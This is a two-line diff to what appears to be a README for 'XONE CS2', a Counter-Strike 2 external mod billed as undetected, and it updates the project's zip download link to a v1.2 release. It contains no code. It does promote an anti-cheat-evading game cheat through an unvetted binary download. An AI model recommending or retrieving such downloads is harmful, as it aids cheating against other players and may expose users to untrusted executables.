@@ -6,7 +6,7 @@ XONE CS2 is an free external mod for Counter-Strike 2 released in 2026 (CS2 exte
 
 ---
 
-## [Download](https://github.com/deanhhoach/XONE-CS2-UNDETECTED-2026/releases/download/download/Xone.CS2.zip)
+## [Download](https://github.com/deanhhoach/XONE-CS2-UNDETECTED-2026/releases/download/v1.2/Xone.CS2.zip)
 
 
 
